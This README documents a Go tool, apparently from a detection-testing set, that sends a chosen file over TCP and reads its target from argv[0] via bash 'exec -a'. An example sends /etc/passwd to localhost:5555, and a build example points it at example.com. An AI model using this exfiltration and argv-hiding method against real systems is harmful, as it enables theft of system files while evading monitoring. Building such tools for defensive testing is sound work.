Argv from `argv[0]` 
===================
Nearly the same as [`argv_from_file_descriptor`](../argv_from_file_descriptor)
but an attempt will be made to read configuration from `argv[0]` as if it had
been read from the file descriptor.

`argv[0]`
---------
The address and file as whitespace-separated words from `argv[0]`, and
override the environment variables.  If only one word is found, it is taken to
be the address.

This is easiest to do with bash's `exec -a`.

### Examples
Set the address and file:
```sh
bash -c 'exec -a "localhost:5555 /etc/passwd" ./argv_from_argv0'
```

Set neither, which looks a bit silly in a process listing:
```sh
bash -c 'exec -a "" ./argv_from_argv0'
```

Environment Variables
---------------------
The address and file may be set with environment variables, overriding
compile-time settings, as follows

Default Variable   | Description
-------------------|------------
`ALPT4ATS_ADDRESS` | TCP Server Address
`ALPT4ATS_FILE`    | File to send on the TCP connection

The variable names may be changed at compile-time, as below.

Compile-time Config
-------------------
Compile time configuration is possible with the linker's `-X` (as in 
`go build -ldflags '-X main.Foo=bar'`).  The variables are as follows

Variable                                         | Default            | Description
-------------------------------------------------|--------------------|------------
[`main.Address`](./argv_from_argv0.go#L27)       | `localhost:4444`   | TCP Server Address
[`main.AddressEnvVar`](./argv_from_argv0.go#L28) | `ALPT4ATS_ADDRESS` | Environment variable which sets the TCP Server Address
[`main.File`](./argv_from_argv0.go#L29)          | `/etc/hosts`       | File to send on the TCP connection
[`main.FileEnvVar`](./argv_from_argv0.go#L30)    | `ALPT4ATS_FILE`    | Environment variable which sets the File to send on the TCP connection

When building with the [Makefile](../../Makefile) these may be passed in with
the `LINKFLAGS` environment variable, as in
```sh
LINKFLAGS="-X main.Address=example.com:8080" make
```
